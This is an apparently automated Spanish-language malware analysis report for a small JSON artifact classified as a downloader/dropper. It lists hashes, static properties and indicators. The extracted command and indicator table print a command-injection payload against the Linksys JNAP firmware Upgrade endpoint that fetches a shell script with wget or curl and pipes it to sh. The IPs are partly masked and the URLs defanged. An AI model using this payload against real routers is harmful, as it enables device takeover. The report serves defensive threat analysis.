# 🧬 Payload Analysis

`c8b676ebe2155b0b1999042cd75557a39d0f3b0e129a521ed5e90438d954c51d`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c8b676ebe2155b0b1999042cd75557a39d0f3b0e129a521ed5e90438d954c51d`
- **SHA1:** `f35eb2d698abb656654d133f26e949fa846fe980`
- **MD5:** `0c7d420d3fa74341d2c44f8d190836e5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 289 B |
| Entropía | 5.16 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap3 | strings |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| hash | c8b676ebe2155b0b1999042cd75557a39d0f3b0e129a521ed5e90438d954c51d | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40 | strings |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
